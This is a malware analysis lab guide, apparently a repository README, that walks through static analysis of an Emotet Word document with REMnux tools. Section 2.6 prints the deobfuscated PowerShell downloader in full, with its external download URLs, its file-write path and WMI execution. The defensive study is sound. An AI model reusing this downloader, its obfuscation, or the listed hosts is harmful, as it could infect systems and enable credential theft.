# REMnuxSec-Lab - A Malware Analysis Lab

🛡️ **REMnuxSec-Lab** – A malware analysis lab using `REMnux` for **static malware analysis**. Includes setup instructions, safe practices, and guided analysis of a malware sample (malware.bin).

---

## Disclaimer

- This project is for **educational and research purposes only**.  
- Always perform analysis in a **virtualized, isolated environment**.

---

## 1. Setup Instructions

### 1.1 Install Virtualization Software

- [VirtualBox](https://www.virtualbox.org/wiki/Downloads)
- [VMware Fusion](https://www.vmware.com/products/fusion.html)
- [UTM](https://mac.getutm.app/)

### 1.2 Download REMnux

1. Get the REMnux `.ova` image from [https://remnux.org](https://remnux.org).  

2. Import the OVA into your hypervisor.  

3. Allocate resources:  
   - RAM: `4–8 GB`
   - CPU: `2+ cores` 
   - Disk: `20 GB+`

4. Configure the network interface:
    - `NAT mode` → isolates the VM from your local network while allowing internet access.
    - Optional: use `Host-Only` if you want the VM completely isolated from the internet. 

![REMnux VM](/screenshots/get_started.png)

### 1.3 Take a Snapshot

Before beginning analysis, create a snapshot:

![REMnux VM](/screenshots/snapshot.png)

---

## 2. Analyze Malware

### 2.1 Generate SHA256 Hash

We first generate the `SHA256` hash of the malware file. This **ensures we have a unique fingerprint for the file**, which is useful for tracking, verification, and searching in threat intelligence databases.

```bash
sha256sum malware.bin
```

![Generate SHA256 Hash value](/screenshots/malware_hash_value.png)

### 2.2 Search the Hash on VirusTotal

Next, we use the SHA256 hash to check VirusTotal. **VirusTotal aggregates antivirus results and threat intelligence to identify malware families**.

**Steps**:

1. Go to [VirusTotal](https://www.virustotal.com/)

2. Paste the SHA256 hash:

```bash
d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee
```
 
3. View File Details (In the `Details` section on VirusTotal), we see:
    - File type: MS Word Document (Knowing the file type helps select the correct analysis tools)

![VirusTotal Malware File Type](/screenshots/virustotal.png)

4. View Malware Family (In the `Detection` section on VirusTotal):
    - `Downloader/DOC.Emotet.S1072`

![VirusTotal Malware Family](/screenshots/malware_family.png)

**About this malware family**:

- Emotet is a well-known **banking Trojan and malware downloader**.

- It often spreads via **malicious Word or Excel documents** with macros.

- Once executed, Emotet can **download additional malware**, steal credentials, and propagate across networks.

- The `Downloader/DOC.Emotet.S1072` tag indicates this sample is a **document-based downloader variant** used for spreading Emotet infections.

### 2.3 View File Details

We use the `file` command to inspect the malware sample and identify its type. This provides metadata without executing the file, which is **safe for initial analysis**.

```bash
file malware.bin
```

![Malware File Type](/screenshots/malware_file_type.png)

**Explanation / Why**:

- The file is identified as a **Microsoft Word document (Composite Document File V2)**.

- Metadata shows it was created using Microsoft Word with the template `Normal.dotm`.

- Creation and last saved timestamps are visible.

- Number of pages, words, and characters give a quick overview of document content size.

- Security: 0 indicates **no password protection**.

**Importance**:

- Confirms the file type matches what VirusTotal reported.

- Helps determine which **analysis tools** to use next (e.g., `oledump.py` for inspecting macros).

- Safe static inspection without executing the malware.

## 2.4 Execute `oledump.py` to Identify Macro Streams

We use `oledump.py` to inspect the internal streams of the Word document. **This allows us to locate and analyze embedded macros**, which are often used by malware like Emotet.

```bash
oledump.py malware.bin
```

![Malware oledump output](/screenshots/oledump.png)

**Explanation of Columns:**

- **Stream number** → identifies the internal stream inside the OLE container.

- **Size (bytes)** → size of the stream content.

- **Stream name** → indicates the type or location of the content inside the document.

**Meaning of `M` and `m`:**

- **`M` (Uppercase)** → stream contains **macro code (VBA)**. These are potentially active and executable macros.

- **`m` (Lowercase)** → stream contains **macro metadata or supporting macro structures**, not directly executable, but relevant to the macro project.

**Why**:

- Identifying `M` streams tells us **where malicious code is located**.

- This allows the analyst to extract, inspect, and deobfuscate VBA code safely.

- Helps in **mapping which macros could execute payloads** if the document is opened.

## 2.5 Analyze Macros with `olevba` and `oledump.py`

Next, we analyze the macros embedded in the document to identify **potentially malicious code** such as Base64-encoded payloads.

1. Scan the document with `olevba`

`olevba` is a REMnux tool used to extract and detect suspicious macro activity, including encoded content.

```bash
olevba malware.bin
```

![Malware olevba output](/screenshots/olevba_suspicious_base64.png)

**Output highlights:**

- Suspicious activity detected: Base64 strings

- Macro stream containing suspicious code: `Macros/roubhaol/109/0`

**Why:**

- Base64 strings are often used to obfuscate payloads inside macros.

- Detecting them helps identify where the malicious code resides.

2. Locate the Macro Stream with `oledump.py`

We use `oledump.py` to confirm the stream number:

```bash
oledump.py malware.bin
```

![Malware base64 oledump](/screenshots/base64_macros_stream.png)

**Relevant stream found:**

```bash
34: 15164 'Macros/roubhaol/109/0'
```

**Explanation:**

- Stream `34` contains **the actual macro code with Base64-encoded content**.

- This stream is flagged by `olevba` as suspicious.

3. Extract and View Base64 Code:

To inspect the macro stream content, use `oledump.py` with the `-s` (stream) and `-S` (show raw content) options:

```bash
oledump.py -s 34 -S malware.bin
```

![Malware Base64 content](/screenshots/base64_content.png)

**Output:**

- Displays the **Base64-encoded** string embedded in the macro.

**Why:**

- Extracting Base64 allows us to **decode and analyze the hidden payload** safely.

- This is a key step in **understanding what the malware will do** if executed.

### 2.6 Decode and Analyze Malicious Base64 Code

1. Detect Obfuscated Base64:

After extracting the macro stream using `oledump.py`, we see that the macros contain a **Base64-encoded string** that is **obfuscated/padded** with repeated values:

```bash
2342772g3&*gs7712ffvs626fq
```

![Malware Base64 Encoded](/screenshots/base64_encoded_string.png)

**Why:**

- Malware often obfuscates Base64 strings to prevent **automatic detection** by security tools.

- Removing the padding is necessary to decode the real payload.

2. Clean and Decode Base64:

We remove the repeated obfuscation value (`2342772g3&*gs7712ffvs626fq`) using find/replace (e.g., CyberChef).

![Malware Base64 Decoded](/screenshots/base64_decoded.png)

**Result:**

```bash
powershell -e [Base64 Code]
```

**Why:**

- Indicates that the malware executes a **PowerShell command** to run its payload.

- Extracting the Base64 code lets us **decode and inspect the actual instructions** without executing them.

3. Decode the PowerShell Code

After decoding the Base64, we see the malicious PowerShell script:

```powershell
$liechrouhwuuw = 'vuacdouvcivoxhaol';

[Net.ServicePointManager]::"SE`cURiTy`PRO`ToCOl" = 'tls12, tls11, tls';

$deichbeudreiir = '337';
$quoadgoijveum   = 'duuvmoezhaitgoh';
$toehefethxohbaey = $env:userprofile + '\' + $deichbeudreiir + '.exe';

$sieinteed = 'quainqualoaz';
$reusthoas = .('n'+'ew-ob'+'ject') Net.webclienT;
$jacleewiyqu = 'https://haoqunkong.com/bn/s9w4tgcjlf66uguw4bj/*https://www.techtravel.events/informationl/8lsjh.../ *https://digiwebmarketing.com/wp-admin/72t0jjhmv7takwvisfnz_eejvf_h6v2ix/*https://holfve.se/images/1ckw5mj49w_2k11px_d/*https://www.cfm.nl/_backup/yfhrmh6u0heidnwrwha2t4mjjz6p_yxhyu390i6_q93hkh3ddm/'."s`Plit"([char]42);

$seccierdeeeth = 'duuzyeawpuaq';
foreach ($geersieb in $jacleewiyqu) {
    try {
        $reusthoas."dOWN`loA`dfi`Le"($geersieb, $toehefethxohbaey);
        $buhxeuah = 'doeydeidquaijleuc';
        
        if ((.('Get-'+'Ite'+'m') $toehefethxohbaey)."l`eNGTH" -ge 24751) {
            ([wmiclass]'win32_Process')."C`ReaTE"($toehefethxohbaey);
            $quoodteeh = 'jiafruuzlaolthoi';
            break;
        }
        $chigchienteiqu = 'yoovveihniej';
    } catch {}
}

$toizluulufier = 'foqulevcaoj'
```
4. What the PowerShell Code Does:

    - Setup TLS protocols (Ensures HTTPS connections are allowed, even on older systems)
    ```powershell
    [Net.ServicePointManager]::"SE`cURiTy`PRO`ToCOl" = 'tls12, tls11, tls';
    ```

    - Define payload location (Downloads payload to `C:\Users\<User>\337.exe`)
    ```powershell
    $toehefethxohbaey = $env:userprofile + '\' + $deichbeudreiir + '.exe';
    ```

    - Create WebClient object (Obfuscated object to download files)
    ```powershell
    $reusthoas = .('n'+'ew-ob'+'ject') Net.webclienT;
    ```

    - List of download URLs (Multiple URLs for redundancy)
    ```powershell
    $jacleewiyqu = 'https://.../.../...'.Split([char]42);
    ```

    - Download and save payload (Downloads the `.exe` file from each URL)
    ```powershell
    $reusthoas."dOWN`loA`dfi`Le"($geersieb, $toehefethxohbaey);
    ```

    - Verify file size and execute (Ensures payload is fully downloaded before execution)
    ```powershell
    if ((Get-Item $toehefethxohbaey).Length -ge 24751) {
    ([wmiclass]'win32_Process').Create($toehefethxohbaey);
    }
    ```

    - Loop until successful

---

## 3. Malware Analysis Summary

### File Information
- **Name:** malware.bin
- **SHA256:** d50d98dcc8b7043cb5c38c3de36a2ad62b293704e3cf23b0cd7450174df53fee
- **Type:** MS Word Document (Composite Document File V2)
- **Malware Family:** Downloader/DOC.Emotet.S1072

### Macro Analysis
- Identified using `oledump.py`
- Suspicious stream: `'Macros/roubhaol/109/0'`
- Contains obfuscated Base64 string

### Base64 & PowerShell
- Obfuscation value: `2342772g3&*gs7712ffvs626fq`
- After removal, Base64 decodes to PowerShell downloader
- Downloads `.exe` payload to user profile folder (`337.exe`)
- Iterates multiple URLs until download succeeds

### Payload Behavior
- Sets TLS protocols for secure download
- Executes payload via WMIC if download is successful
- Obfuscated and stealthy execution to evade detection

### Impact
- Downloads and runs Emotet malware
- Can steal credentials, drop additional malware, and propagate across networks


